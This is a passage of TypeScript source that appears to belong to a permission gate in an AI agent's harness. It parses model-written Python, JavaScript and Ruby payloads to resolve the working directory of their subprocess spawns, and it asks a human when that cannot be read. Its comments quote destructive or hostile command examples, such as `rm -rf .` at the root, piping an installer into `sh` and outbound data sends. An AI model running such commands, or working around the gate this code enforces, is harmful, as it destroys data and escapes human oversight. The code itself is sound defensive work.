const EVAL_CWD_SITES_PY: EvalCwdSite[] = [
	{ pattern: /\bsubprocess\s*\.\s*\w+/u, name: "subprocess", kind: "spawn" },
	{ pattern: /\basyncio\s*\.\s*create_subprocess\w*/u, name: "asyncio.create_subprocess", kind: "spawn" },
	{ pattern: /(?:^|[^\w.$])(?:run|Popen|call|check_call|check_output)\b/u, name: "subprocess", kind: "spawn" },
];

/** RB: the shell-literal surfaces those kernels use, plus the two chdir forms.
 *  `chdir:` is handled by the keyed read; `Dir.chdir` by the positional one. */
const EVAL_CWD_SITES_RB: EvalCwdSite[] = [
	{ pattern: /(?:^|[^\w.$])(?:system|spawn|popen|open3)\b/u, name: "system/spawn", kind: "spawn", parenless: true },
	{ pattern: /\b(?:Dir\s*\.\s*chdir|FileUtils\s*\.\s*cd)\b/u, name: "Dir.chdir", kind: "chdir", positional: true, parenless: true },
];

/** What a masked string body becomes. NOT a space: the scan skips whitespace to
 *  find the argument list after a callee, and a string sitting there must stop
 *  that walk instead of being walked through. Not a bracket, delimiter or word
 *  character either, so balance, value boundaries and token matches all behave
 *  as if the text were never there. */
const MASK_FILL = "\u0001";

/** End (exclusive) of the string literal starting at `start`, or -1 when it
 *  never closes. Escapes are respected, a quoted string may not span lines in
 *  any of these languages (backticks and Python's triple quotes may). */
function scanStringEnd(text: string, start: number): number {
	const quote = text[start];
	if (text[start + 1] === quote && text[start + 2] === quote) {
		for (let i = start + 3; i < text.length; i += 1) {
			if (text[i] === "\\") {
				i += 1;
				continue;
			}
			if (text.startsWith(quote.repeat(3), i)) return i + 3;
		}
		return -1;
	}
	for (let i = start + 1; i < text.length; i += 1) {
		const char = text[i];
		if (char === "\\") {
			i += 1;
			continue;
		}
		if (char === "\n" && quote !== "`") return -1;
		if (char === quote) return i + 1;
	}
	return -1;
}

/** Blank the parts of a payload that are text, not code: every string body,
 *  and every comment. Length is preserved so indices map straight back to the
 *  original, which is where values are read from.
 *
 *  Without this, `subprocess.run(["sh", "-c", "cwd=/tmp"])` reads as a spawn in
 *  /tmp and `cwd="/tmp"  # cwd="/evil"` reads as /evil — false directories of
 *  exactly the kind this scan exists to stop reporting. */
function maskCodeText(code: string): string {
	let masked = "";
	let i = 0;
	while (i < code.length) {
		const char = code[i];
		if (char === '"' || char === "'" || char === "`") {
			const end = scanStringEnd(code, i);
			const stop = end === -1 ? code.length : end;
			masked += MASK_FILL.repeat(stop - i);
			i = stop;
			continue;
		}
		if (char === "#" || (char === "/" && code[i + 1] === "/")) {
			while (i < code.length && code[i] !== "\n") {
				masked += " ";
				i += 1;
			}
			continue;
		}
		if (char === "/" && code[i + 1] === "*") {
			const end = code.indexOf("*/", i + 2);
			const stop = end === -1 ? code.length : end + 2;
			masked += code.slice(i, stop).replace(/[^\n]/gu, " ");
			i = stop;
			continue;
		}
		masked += char;
		i += 1;
	}
	return masked;
}

/** Index of the bracket that closes the group opening at `open`, or -1 when the
 *  payload's structure runs out first. */
function scanGroupEnd(masked: string, open: number): number {
	let depth = 0;
	for (let i = open; i < masked.length; i += 1) {
		const char = masked[i];
		if (char === "(" || char === "[" || char === "{") depth += 1;
		else if (char === ")" || char === "]" || char === "}") {
			depth -= 1;
			if (depth === 0) return i;
		}
	}
	return -1;
}

/** End (exclusive) of a cwd VALUE: the first delimiter at the value's own
 *  nesting depth. `subprocess.run(["ls"], cwd=join(a, b))` ends at the call's
 *  closing paren, not at the comma inside `join`. */
function scanValueEnd(masked: string, start: number, end: number): number {
	let depth = 0;
	for (let i = start; i < end; i += 1) {
		const char = masked[i];
		if (char === "(" || char === "[" || char === "{") depth += 1;
		else if (char === ")" || char === "]" || char === "}") {
			if (depth === 0) return i;
			depth -= 1;
		} else if (depth === 0 && (char === "," || char === ";" || char === "\n")) return i;
	}
	return end;
}

/** The directory text of a cwd argument, or null when it is not a plain string
 *  literal. Everything else — a variable, a call, an f-string, an interpolated
 *  Ruby string, a concatenation, a value with an escape this does not model —
 *  is unreadable on purpose: the caller turns that into a permission request
 *  rather than a directory it guessed. */
function cwdLiteralText(raw: string): string | null {
	// The body may not contain an unescaped copy of its own quote: without that
	// `"/tmp/a" + "/b"` (and Python's implicit `"/tmp/a" "/b"`) reads as one
	// string whose text is `/tmp/a" + "/b`, a directory that exists nowhere.
	const match = /^([A-Za-z]{0,2})(["'])((?:(?!\2)[\s\S])*)\2$/u.exec(raw);
	if (!match) return null;
	const [, prefix, , body] = match;
	// f-strings interpolate; a prefix that could interpolate is not a literal.
	if (/[fF]/u.test(prefix)) return null;
	if (body.includes("#{") || body.includes("${")) return null;
	let text = "";
	for (let i = 0; i < body.length; i += 1) {
		if (body[i] !== "\\") {
			text += body[i];
			continue;
		}
		// Only the escapes that cannot change which directory is named are
		// modeled; `\t`, `\x41` and friends stay unreadable.
		if (body[i + 1] !== "\\") return null;
		text += "\\";
		i += 1;
	}
	return text;
}

/**
 * Read a spawn's cwd literal (issue #14) into the absolute directory the
 * payload would run in, or null when it cannot be resolved.
 *
 * `resolveToCwd` is the bash path's resolver for a leading `cd`, so a relative
 * literal resolves against the directory in effect exactly as bash resolves one
 * against the session directory. A BARE `/` is the one exception: resolveToCwd
 * treats it as a workspace-root alias (its doc comment says so, "for tool
 * inputs"), while a spawned child has no such alias — `cwd="/"` really is the
 * filesystem root, and reading it as the session directory would UNDERSTATE
 * what `rm -rf .` does there, the one direction this gate may never fail in.
 * An internal URL and an empty string are not directories a child can run in,
 * so both are unreadable rather than approximated.
 */
function resolveSpawnCwdLiteral(raw: string, base: string): string | null {
	if (raw === "" || raw.includes("://") || raw.includes("local:/")) return null;
	const resolved = /^\/+$/u.test(raw) ? "/" : resolveToCwd(raw, base);
	return resolved === "" ? null : resolved;
}

/** One cwd argument found in a call's arguments. `value` is the argument's
 *  SOURCE text (quotes and all) and `detail` the source text of an unreadable
 *  one, for the dialog: the human decides what to do with a directory the scan
 *  refused to guess. Whether that source text is a literal, and what directory
 *  it names, is decided in one place — see evalSpawnCwd. */
type EvalCwdArgument = { kind: "none" } | { kind: "value"; value: string } | { kind: "dynamic"; detail: string };

/** One `cwd`/`chdir` key found in a call's own arguments, with the bracket
 *  depth it sits at (so the outermost is the one that counts) and its offset in
 *  the masked text (so an object spread written after it can be told apart from
 *  one written before it). */
interface EvalCwdKey {
	depth: number;
	at: number;
	argument: EvalCwdArgument;
}

/** The same key narrowed to a readable literal: the shape a value check leaves
 *  behind, for callers that need `.value` without asserting it. */
interface EvalCwdLiteralKey extends EvalCwdKey {
	argument: { kind: "value"; value: string };
}

/** The directory argument of a positional site (`Dir.chdir("/tmp")`,
 *  `` `ls`.cwd("/tmp") ``): the call's FIRST argument, read as one token. */
function readPositionalCwd(masked: string, code: string, start: number, end: number): EvalCwdArgument {
	let i = start;
	while (i < end && (masked[i] === " " || masked[i] === "\t")) i += 1;
	if (i >= end) return { kind: "none" };
	const quote = code[i];
	if (quote === '"' || quote === "'" || quote === "`") {
		const quoted = scanStringEnd(code, i);
		if (quoted === -1) return { kind: "dynamic", detail: truncated(code.slice(i), 60) };
		// A quoted string is the directory only when the call ends there or a
		// block follows (`Dir.chdir "/tmp" do … end`). Anything else can extend
		// the value past what was read — `Dir.chdir "/a" "/b"` is not /a.
		const rest = code.slice(quoted).trimStart();
		if (rest === "" || /^[),;{}\n]/u.test(rest) || /^(?:do|then|end)\b/u.test(rest)) {
			return { kind: "value", value: code.slice(i, quoted) };
		}
	}
	return { kind: "dynamic", detail: truncated(code.slice(i, Math.max(i + 1, scanValueEnd(masked, i, end))).trim(), 60) };
}

/** The cwd an options object or keyword argument names, as far as the scan can
 *  read it. Only the OUTERMOST `cwd`/`chdir` reference in the call counts: a
 *  `cwd` inside a nested call's arguments (`env=build(cwd=…)`) is that call's,
 *  not this spawn's. A bare `cwd` in key position — `{ cwd }`, the shorthand the
 *  issue lists — is a variable, so it is unreadable, not absent. */
function readKeyedCwd(masked: string, code: string, start: number, end: number): EvalCwdArgument {
	// Bracket depth AND the group enclosing each offset, so a `cwd` can be told
	// apart from one that belongs to a nested call: `env=make(cwd=…)` is make's
	// keyword, not this spawn's, while `{ cwd: … }` IS this spawn's options
	// object — a property one level down, inside the call's own brace. Without
	// the distinction the nested value wins whenever it is the only one, and the
	// spawn is judged in a directory only its environment builder runs in.
	const depth: number[] = [];
	const opener: string[] = [];
	const stack: string[] = [];
	for (let i = start; i < end; i += 1) {
		const char = masked[i];
		if (char === ")" || char === "]" || char === "}") stack.pop();
		depth.push(stack.length);
		opener.push(stack[stack.length - 1] ?? "");
		if (char === "(" || char === "[" || char === "{") stack.push(char);
	}
	const ownArgument = (at: number): { depth: number; inBrace: boolean } | undefined => {
		const relative = at - start;
		if (relative < 0 || relative >= depth.length) return undefined;
		const atDepth = depth[relative];
		const inBrace = opener[relative] === "{";
		// Depth 0 is a keyword of this call (`cwd="/tmp"`); depth 1 inside the
		// call's own brace is a property of its options object (`{ cwd: "/tmp" }`).
		return atDepth === 0 || (atDepth === 1 && inBrace) ? { depth: atDepth, inBrace } : undefined;
	};
	const found: EvalCwdKey[] = [];
	for (const match of masked.slice(start, end).matchAll(/(?<![\w.$])(?:cwd|chdir)\b/gu)) {
		const at = start + (match.index ?? 0);
		const own = ownArgument(at);
		if (own === undefined) continue;
		const after = at + match[0].length;
		let cursor = after;
		while (cursor < end && (masked[cursor] === " " || masked[cursor] === "\t")) cursor += 1;
		const separator = masked[cursor];
		if (separator === ":" || (separator === "=" && masked[cursor + 1] !== "=")) {
			let valueStart = cursor + 1;
			while (valueStart < end && (masked[valueStart] === " " || masked[valueStart] === "\t")) valueStart += 1;
			const raw = code.slice(valueStart, Math.max(valueStart, scanValueEnd(masked, valueStart, end))).trim();
			found.push({ depth: own.depth, at, argument: raw === "" ? { kind: "dynamic", detail: `${match[0]}=` } : { kind: "value", value: raw } });
			continue;
		}
		// Key position only: `{ cwd }` is the shorthand form of the option,
		// while a `cwd` after `:` or `(` is some other expression's value.
		let before = at - 1;
		while (before >= start && (masked[before] === " " || masked[before] === "\t")) before -= 1;
		const previous = before < start ? "" : masked[before];
		const closer = masked[cursor] ?? "";
		if (match[0] === "cwd" && own.inBrace && (previous === "{" || previous === ",") && (closer === "," || closer === "}")) {
			found.push({ depth: own.depth, at, argument: { kind: "dynamic", detail: `{ ${match[0]} }` } });
		}
	}
	if (found.length === 0) {
		// No `cwd` token at all is "this call names no directory" — except when
		// the options came from somewhere else entirely: `{ ...opts }` (JS) and
		// `**opts` (Python) name their keys in no text this scan can read. Then
		// the keys are unknown, which is unreadable, not absent: reporting the
		// session directory there would be a guess wearing a fact's clothes.
		const args = masked.slice(start, end);
		const spread = /\{\s*\.\.\.[^}]*\}/u.exec(args)?.[0] ?? /\*\*[\w$]*/u.exec(args)?.[0];
		return spread ? { kind: "dynamic", detail: spread } : { kind: "none" };
	}
	// A spread can carry this call's own `cwd` key out of text the scan never
	// reads, so a literal found first is not the last word: `cp.exec("x", {
	// cwd: "/tmp", ...opts })` runs wherever `opts` says, and reporting the
	// literal it saw first would name a directory this call does not run in —
	// the one direction this scan may never fail in. The read is
	// order-sensitive in the one language that has object spread (the last
	// write wins), so only a spread AFTER the key can beat it; a `**`
	// expansion is not readable either way (`f(cwd="/tmp", **opts)` is a
	// TypeError when `opts` carries cwd and "/tmp" when it does not, and no
	// text here says which). Only this call's own level counts: a spread
	// inside a nested call's arguments (`env=build({ ...opts })`) is that
	// call's, not this one's.
	const spreads: Array<{ at: number; kwargs: boolean; detail: string }> = [];
	for (const match of masked.slice(start, end).matchAll(/\.{3}|\*{2}/gu)) {
		const at = start + (match.index ?? 0);
		if (ownArgument(at) === undefined) continue;
		// `2 ** 8` is an operator, not an expansion: an expansion starts where
		// a value may start, never right after an operand.
		const head = masked.slice(start, at).trimEnd();
		const previous = head === "" ? "" : (head.at(-1) ?? "");
		if (previous !== "" && !/[(\[{,;=]/u.test(previous)) continue;
		const detail = masked.slice(at, Math.max(at + match[0].length, scanValueEnd(masked, at + match[0].length, end))).trim();
		spreads.push({ at, kwargs: match[0] === "**", detail: truncated(detail === "" ? match[0] : detail, 60) });
	}
	const outermost = Math.min(...found.map(entry => entry.depth));
	const atOutermost = found.filter(entry => entry.depth === outermost);
	const values = atOutermost.filter((entry): entry is EvalCwdLiteralKey => entry.argument.kind === "value");
	if (values.length === atOutermost.length && new Set(values.map(entry => entry.argument.value)).size === 1) {
		const chosen = atOutermost[0];
		const overriding = spreads.find(spread => spread.kwargs || spread.at > chosen.at);
		return overriding ? { kind: "dynamic", detail: overriding.detail } : chosen.argument;
	}
	// A computed value, or the same option set twice: either way there is no
	// single directory this call is known to run in.
	const dynamic = atOutermost.find(entry => entry.argument.kind === "dynamic");
	return dynamic ? dynamic.argument : { kind: "dynamic", detail: "cwd set more than once" };
}

/** One spawn/chdir call the tables matched: its name and kind, the span of its
 *  argument list (`argEnd` is -1 when that list never closes), where the call's
 *  own text starts (for ordering it against the block spans around it), and
 *  where a Ruby block opener after its arguments can sit. */
interface EvalCwdSiteMatch {
	name: string;
	kind: "spawn" | "chdir";
	positional: boolean;
	argStart: number;
	argEnd: number;
	at: number;
	/** For a parenthesized call, right after its closing paren; for a parenless
	 *  one, the call's first argument token, because its `do` sits on the same
	 *  line inside that span. -1 when the argument list does not close. */
	blockFrom: number;
}

/** Every spawn/chdir call site the tables match, in source order, with the span
 *  of its argument list. Matched against the MASKED text so only code can match,
 *  with spans that index the original, which is where values are read.
 *
 *  The tables are scanned as a UNION rather than by the payload's `language`
 *  label. That label is model-written and shared across tool schemas, the marker
 *  scan already refuses to trust it, and the forms overlap — `exec(cmd, { cwd })`
 *  is JavaScript, while a payload labeled `py` can carry `exec(` and still be a
 *  spawn to the marker scan. Reading it with the wrong table would report the
 *  session directory for a spawn that names its own, which is the error this
 *  whole section exists to stop; a stray match costs one question instead. */
function evalCwdSites(masked: string): EvalCwdSiteMatch[] {
	const table = [...EVAL_CWD_SITES_JS, ...EVAL_CWD_SITES_PY, ...EVAL_CWD_SITES_RB];
	const sites = new Map<number, EvalCwdSiteMatch>();
	for (const site of table) {
		for (const match of masked.matchAll(new RegExp(site.pattern.source, `${site.pattern.flags.replace("g", "")}g`))) {
			const at = match.index ?? 0;
			let open = at + match[0].length;
			while (open < masked.length && (masked[open] === " " || masked[open] === "\t")) open += 1;
			if (masked[open] !== "(") {
				if (site.parenless !== true) continue;
				const lineEnd = masked.indexOf("\n", open);
				const argEnd = lineEnd === -1 ? masked.length : lineEnd;
				// A call whose first token is its block (`Dir.chdir do … end`)
				// wrote no argument at all — the block IS the argument list, and
				// an empty span says so instead of reading `do` as a directory.
				const argStart = /^(?:do|then|end|\{)/u.test(masked.slice(open, argEnd).trimStart()) ? argEnd : open;
				if (!sites.has(open))
					sites.set(open, { name: site.name, kind: site.kind, positional: site.positional === true, argStart, argEnd, at, blockFrom: open });
				continue;
			}
			if (sites.has(open)) continue;
			const close = scanGroupEnd(masked, open);
			sites.set(open, {
				name: site.name,
				kind: site.kind,
				positional: site.positional === true,
				argStart: open + 1,
				argEnd: close === -1 ? -1 : close,
				at,
				blockFrom: close === -1 ? -1 : close + 1,
			});
		}
	}
	return [...sites.values()].sort((a, b) => a.argStart - b.argStart);
}

/** The headline the eval gate asks under when a spawn's own directory cannot be
 *  read (issue #14). Named once because two things key on it: the dialog title,
 *  and the rule that this layer offers no grant (see requestPermission). */
const EVAL_SPAWN_CWD_HEADLINE = "unreadable spawn cwd";

/** The directory an eval payload's spawns run in (issue #14), or why the scan
 *  cannot tell. Exported for the test seam: the gate asks once per payload. */
export type EvalSpawnCwd = { kind: "session" } | { kind: "literal"; cwd: string } | { kind: "opaque"; why: string };

/** Ruby keywords that open a block of their own, whose closing token is an
 *  `end`. `end` is in the list because the balance has to see closers too. */
const RUBY_BLOCK_KEYWORD = /^(?:do|if|unless|while|until|case|begin|def|class|module|for|end)$/u;

/**
 * End (exclusive) of the Ruby block opening at `at` — the `do` keyword, or the
 * `{` of a brace block — or -1 when this scan cannot place it.
 *
 * `end` is balanced against the keywords that open a block, so a nested `if` or
 * `each do` inside the block does not close it early. A keyword opens a block
 * only where a statement can start: a mid-expression `puts x if y` is a
 * modifier that needs no `end`, and counting those would run the block past its
 * real end and hand a spawn after it the wrong directory. The trailing `do` of
 * `while x do`/`for x in y do` is that statement's own opener, not a second
 * one. Anything the balance cannot place — an `end` with nothing open, or a
 * keyword that never closes before the payload ends — reports -1, and the
 * caller asks rather than guess a directory.
 */
/** True when the `def` at `defAt` is Ruby 3's endless method definition —
 *  `def helper = 1`, `def helper() = 1`, `def self.helper = 1` — which is a
 *  complete statement on its own line: it opens no block and its `end`-less
 *  body is the expression after the `=`. Counting it as an opener would run
 *  the enclosing block past its real `end` (a spawn written after it would be
 *  judged against a directory Ruby has already restored) or leave the balance
 *  unable to close at all.
 *
 *  The endless `=` is the one that follows the COMPLETE header — the name and,
 *  when present, its parenthesized parameter list. A `=` Ruby binds to the
 *  name token is not it: the setter `def value=(v)`, the element setter
 *  `def []=(k, v)`, and the operators `def ==(other)`/`def <=>(other)` all
 *  carry their `=` inside the name, and a `=` in a parameter list is a default
 *  value (`def helper(x = 1)`, the parenless `def helper x = 1`). Every one of
 *  those is a regular def, an opener whose `end` the balance must count.
 *  Reading the name's `=` as the endless marker was the shipped defect: the
 *  setter's own `end` then closed the enclosing chdir block, and a spawn
 *  written inside the block was judged against the directory Ruby had already
 *  restored — with the two spawn sites agreeing, so nothing asked. The scan
 *  walks the header shape first and only then looks for the standalone `=`,
 *  so those spellings can never reach the marker check. A header this scan
 *  cannot read stays a plain opener, the fail-closed side: an unbalanced
 *  block asks, it does not guess. Text the Ruby grammar rejects outright —
 *  the endless setter `def value=(v) = 1`, a SyntaxError on every Ruby that
 *  has endless methods (Feature #16746) — reads past the name's `=` to the
 *  body one and is skipped; such payloads never run, so no live behavior
 *  turns on that reading. */
function isRubyEndlessDef(masked: string, defAt: number): boolean {
	// The receiver, if any: `self.`, `X.`, `A::B.` — an identifier followed by
	// `.` or `::`, spaces around it allowed. Each round consumes the
	// identifier and the separator, so the loop advances or stops.
	let i = defAt + 3;
	for (;;) {
		while (i < masked.length && /\s/u.test(masked[i])) i += 1;
		const word = /^[A-Za-z_]\w*/u.exec(masked.slice(i));
		if (!word) break;
		let j = i + word[0].length;
		while (j < masked.length && /\s/u.test(masked[j])) j += 1;
		if (masked[j] === ".") i = j + 1;
		else if (masked.startsWith("::", j)) i = j + 2;
		else break;
	}
	// The name: an identifier with its `?`/`!` and a setter's trailing `=`,
	// the element forms `[]`/`[]=`, or an operator (`==`, `===`, `<=`, `<=>`,
	// `!=`, `<<`, `>>`, `**`, the single-char set with `@` for `+@`/`-@`). The
	// longest forms come first so `<=` never leaves a dangling `=` for the
	// marker check below to read; in particular the setter's `=` is consumed
	// HERE, as part of the name, and can never read as a body marker.
	const name = /^(?:[A-Za-z_]\w*[?!]?=?|\[\]=?|===|<=>|!=|==|<=|>=|<<|>>|\*\*|[+\-*/%&|^~<!]@?)/u.exec(masked.slice(i));
	// An unreadable name is not a shape this scan knows: stay a plain opener
	// and let the balance ask when it cannot close.
	if (!name) return false;
	i += name[0].length;
	// An optional parenthesized parameter list, skipped WHOLE (`scanGroupEnd`
	// tracks all bracket pairs, so `def helper(k = {})` survives): the `=` of
	// a default value inside it is a parameter's, never a body marker.
	while (i < masked.length && /\s/u.test(masked[i])) i += 1;
	if (masked[i] === "(") {
		const close = scanGroupEnd(masked, i);
		if (close === -1) return false;
		i = close + 1;
		while (i < masked.length && /\s/u.test(masked[i])) i += 1;
	}
	// Only past the complete header can a standalone `=` introduce the body.
	// Anything else — a newline, a `;`, a parenless parameter list, the
	// payload's end — spells a regular def.
	return masked[i] === "=";
}

function scanRubyBlockEnd(masked: string, at: number): number {
	if (masked[at] === "{") {
		const close = scanGroupEnd(masked, at);
		return close === -1 ? -1 : close + 1;
	}
	let depth = 0;
	for (const match of masked.slice(at).matchAll(/[A-Za-z_]\w*/gu)) {
		const word = match[0];
		if (!RUBY_BLOCK_KEYWORD.test(word)) continue;
		const position = at + (match.index ?? 0);
		if (word === "end") {
			depth -= 1;
			if (depth <= 0) return position + word.length;
			continue;
		}
		// `while x do`/`for x in y do` spell one block two ways: the trailing
		// `do` of such a line is that statement's own opener, not a second one.
		const before = masked.slice(masked.lastIndexOf("\n", position - 1) + 1, position).trimEnd();
		if (word === "do" && /^(?:while|until|for)\b/u.test(before)) continue;
		if (word === "def" && isRubyEndlessDef(masked, position)) continue;
		// Every other `do` opens a block wherever it is written — `items.each do
		// |item|`, and a block-taking call's own `do` after its `)`. The other
		// keywords open one only where a statement can start: a mid-expression
		// `puts x if y` is a modifier that needs no `end`, and counting those
		// would run the block past its real end and hand a spawn written after
		// it the directory of a block that is already over.
		if (word !== "do" && before !== "" && !/[(,=;|&[{]$/u.test(before)) continue;
		depth += 1;
	}
	return -1;
}

/** How a Ruby chdir call's directory change ends: for the rest of the payload
 *  (`Dir.chdir("/tmp")`, no block), or for the block alone — Ruby restores the
 *  previous directory when the block returns, so a spawn after the block runs
 *  where the payload started, not where the block did. `unreadable` is the
 *  fail-closed case: the block is there but its end cannot be placed, and a
 *  directory this scan cannot bound is one it must not report. */
type EvalChdirScope = { kind: "process" } | { kind: "block"; end: number } | { kind: "unreadable"; why: string };

/**
 * Read which directory state a Ruby chdir call leaves behind. The block opener
 * is looked for on the call's own line and after its arguments: Ruby's `do` and
 * `{` bind to the call they follow, and a bare hash argument cannot be mistaken
 * for one here because the only caller is a chdir, which takes its directory as
 * a single positional argument.
 */
function evalChdirScope(masked: string, site: EvalCwdSiteMatch): EvalChdirScope {
	if (site.blockFrom === -1) return { kind: "unreadable", why: "the argument list does not close" };
	// The call's own statement ends at its line, or at a `;`: a block opener
	// written after either one belongs to the next statement, not to this call
	// (`Dir.chdir("/tmp"); items.each do … end` moves the payload's directory
	// for good, and that `do` is `each`'s).
	const cuts = [masked.indexOf("\n", site.blockFrom), masked.indexOf(";", site.blockFrom), masked.length].filter(at => at !== -1);
	const header = masked.slice(site.blockFrom, Math.min(...cuts));
	const doAt = /(?<![\w$])do(?=[\s|]|$)/u.exec(header);
	const braceAt = header.indexOf("{");
	const doOffset = doAt === null ? -1 : site.blockFrom + (doAt.index ?? 0);
	const braceOffset = braceAt === -1 ? -1 : site.blockFrom + braceAt;
	if (doOffset === -1 && braceOffset === -1) return { kind: "process" };
	const opener = braceOffset === -1 || (doOffset !== -1 && doOffset < braceOffset) ? doOffset : braceOffset;
	const end = scanRubyBlockEnd(masked, opener);
	return end === -1 ? { kind: "unreadable", why: "the block's end cannot be read" } : { kind: "block", end };
}

/**
 * Read the directory an eval payload spawns in, resolved against the session
 * directory it starts from. The payload's `language` label does not take part:
 * see evalCwdSites.
 *
 * Sites are walked in source order because a chdir moves the directory for the
 * sites after it, and a relative literal resolves against whatever directory is
 * in effect at that point. A Ruby `Dir.chdir("…") do … end` moves it for the
 * block alone, so what it moved is kept for the sites the block contains and
 * dropped at the first site past it; a `Dir.chdir("…")` with no block moves it
 * for the rest of the payload. Every spawn site is counted, not just the ones
 * that name a directory: a site with no cwd runs in the directory in effect,
 * which is a fact about the payload, not a guess. When those facts disagree —
 * one spawn in the session directory, another in `/` — there is no single
 * directory this payload runs in, and the answer is "ask", not one of the two.
 */
export function evalSpawnCwd(code: string, sessionCwd: string): EvalSpawnCwd {
	const masked = maskCodeText(code);
	const sites = evalCwdSites(masked);
	if (sites.length === 0) return { kind: "session" };
	let current = sessionCwd;
	/** The chdir blocks still open at this point in the walk, innermost last. */
	const blocks: Array<{ end: number; saved: string }> = [];
	const perSite: string[] = [];
	let opaque = "";
	for (const site of sites) {
		// The block is over once the walk reaches a site it does not contain:
		// that site — and every one after it — runs in the directory the chdir
		// found in place, not the one it moved to.
		while (blocks.length > 0) {
			const open = blocks[blocks.length - 1];
			if (open.end > site.at) break;
			blocks.pop();
			current = open.saved;
		}
		if (site.argEnd === -1) {
			if (opaque === "") opaque = `${site.name}: the argument list does not close`;
			continue;
		}
		const argument = site.positional ? readPositionalCwd(masked, code, site.argStart, site.argEnd) : readKeyedCwd(masked, code, site.argStart, site.argEnd);
		if (argument.kind === "none") {
			// `Dir.chdir()` with nothing in it goes to the home directory, which
			// is not a directory this scan can name.
			if (site.kind === "chdir") {
				if (opaque === "") opaque = `${site.name}: no directory argument`;
				continue;
			}
			perSite.push(current);
			continue;
		}
		if (argument.kind === "dynamic") {
			if (opaque === "") opaque = `${site.name}: the cwd is not a literal (${argument.detail})`;
			continue;
		}
		const literal = cwdLiteralText(argument.value);
		if (literal === null) {
			if (opaque === "") opaque = `${site.name}: the cwd is not a literal (${truncated(argument.value, 60)})`;
			continue;
		}
		const resolved = resolveSpawnCwdLiteral(literal, current);
		if (resolved === null) {
			if (opaque === "") opaque = `${site.name}: ${truncated(argument.value, 60)} does not name a directory`;
			continue;
		}
		if (site.kind === "chdir") {
			const scope = evalChdirScope(masked, site);
			if (scope.kind === "unreadable") {
				if (opaque === "") opaque = `${site.name}: ${scope.why}`;
				continue;
			}
			if (scope.kind === "block") blocks.push({ end: scope.end, saved: current });
			current = resolved;
		} else perSite.push(resolved);
	}
	if (opaque !== "") return { kind: "opaque", why: opaque };
	// A chdir block the payload is still inside where its text ends is the
	// directory of the spawns this table does not model — `Dir.chdir("/tmp") do
	// \`ls\` end` is that payload — which is what the fallback below reads. A
	// block that closed with code after it did not leave the payload there: the
	// payload's own directory is the restored one, so `Dir.chdir("/tmp") { }`
	// followed by \`ls\` spawns in the session directory, not in the empty
	// block's. Trailing whitespace is not code, so the common `… end\n` spelling
	// of a block that wraps the payload keeps its directory.
	while (blocks.length > 0) {
		const open = blocks[blocks.length - 1];
		if (masked.slice(open.end).trim() === "") break;
		blocks.pop();
		current = open.saved;
	}
	// A chdir that moved the payload's own directory is also the directory of
	// every spawn this table does not model (`Dir.chdir("/tmp") do \`ls\` end`):
	// when no site named one, the payload's own directory is the answer.
	const effective = perSite.length === 0 ? [current] : perSite;
	const distinct = [...new Set(effective)];
	if (distinct.length > 1) return { kind: "opaque", why: `spawn sites run in different directories (${distinct.join(", ")})` };
	return samePath(distinct[0], sessionCwd) ? { kind: "session" } : { kind: "literal", cwd: distinct[0] };
}

// Commands whose ARGUMENT is the program that runs: look through them to the
// binary they name. env/nice/timeout/stdbuf take options or durations first.
const WRAPPER_COMMANDS = new Set(["env", "nohup", "nice", "timeout", "stdbuf", "setsid", "command", "exec", "xargs"]);

type WrapperOptionArity = "flag" | "value" | "opaque";
interface WrapperOptionGrammar {
	options: Record<string, WrapperOptionArity>;
	assignments?: boolean;
	positionalValues?: number;
}

/** Options each recognized wrapper consumes before its command operand. */
const WRAPPER_OPTION_GRAMMAR: Record<string, WrapperOptionGrammar> = {
	env: {
		assignments: true,
		options: {
			"-i": "flag", "--ignore-environment": "flag", "-0": "flag", "--null": "flag",
			"-v": "flag", "--debug": "flag", "--help": "flag", "--version": "flag",
			"-u": "value", "--unset": "value", "-C": "value", "--chdir": "value",
			"-a": "value", "--argv0": "value", "-S": "opaque", "--split-string": "opaque",
		},
	},
	nohup: { options: { "--help": "flag", "--version": "flag" } },
	nice: { options: { "-n": "value", "--adjustment": "value", "--help": "flag", "--version": "flag" } },
	timeout: {
		positionalValues: 1,
		options: {
			"-k": "value", "--kill-after": "value", "-s": "value", "--signal": "value",
			"--preserve-status": "flag", "--foreground": "flag", "-v": "flag", "--verbose": "flag",
			"--help": "flag", "--version": "flag",
		},
	},
	stdbuf: {
		options: {
			"-i": "value", "--input": "value", "-o": "value", "--output": "value",
			"-e": "value", "--error": "value", "--help": "flag", "--version": "flag",
		},
	},
	setsid: {
		options: {
			"-c": "flag", "--ctty": "flag", "-f": "flag", "--fork": "flag",
			"-w": "flag", "--wait": "flag", "-t": "flag", "--help": "flag", "--version": "flag",
		},
	},
	command: { options: { "-p": "flag", "-v": "opaque", "-V": "opaque" } },
	exec: { options: { "-a": "value", "-c": "flag", "-l": "flag" } },
	xargs: {
		options: {
			"-0": "flag", "--null": "flag", "-r": "flag", "--no-run-if-empty": "flag",
			"-t": "flag", "--verbose": "flag", "-p": "flag", "--interactive": "flag",
			"-x": "flag", "--exit": "flag", "-o": "flag", "--open-tty": "flag",
			"--show-limits": "flag", "--help": "flag", "--version": "flag",
			"-n": "value", "--max-args": "value", "-s": "value", "--max-chars": "value",
			"-P": "value", "--max-procs": "value", "-d": "value", "--delimiter": "value",
			"-E": "value", "--eof": "value", "-I": "value", "-L": "value",
			"--max-lines": "value", "-a": "value", "--arg-file": "value",
			"--process-slot-var": "value", "--replace": "opaque",
		},
	},
};

// git global options that CONSUME a value: skip the option AND its value when
// hunting for the subcommand (`git -C /repo push` must read push, not /repo).
const GIT_VALUE_OPTIONS = new Set(["-c", "-C", "--git-dir", "--work-tree", "--namespace", "--super-project"]);

// ---------------------------------------------------------------------------
// Network fetches
//
// `curl` and `wget` are NOT in the forced-dialog set: the judge owns network
// reads like every other read. A plain URL fetch to stdout or into read-only
// consumers is SAFE; fetch-and-execute and local-data-to-remote are what the
// battery's egress hazards (contacts_remote_endpoint, sends_local_data_outbound)
// answer to.
//
// This file section survives ONLY as the clearing input for
// commandHasOutboundNetwork: isPlainReadOnlyFetch recognizes a read-shaped
// fetch, so the scan does not report a read as an endpoint contact. Its
// consumer is no longer the decision path — replay, the eval harness, and
// tests read it — and the tables stay fail-closed in that role: an
// unrecognized flag, redirect, substitution or `@` means "not provably a
// read", which costs the fetch its clearing, never a silent run.
//
// The stdin-executing-interpreter scan (`cat ./installer | sh`) is a
// different risk class and stays in the forced-dialog set.
// ---------------------------------------------------------------------------

/**
 * Things that execute what is piped into them. This one IS a denylist, which is
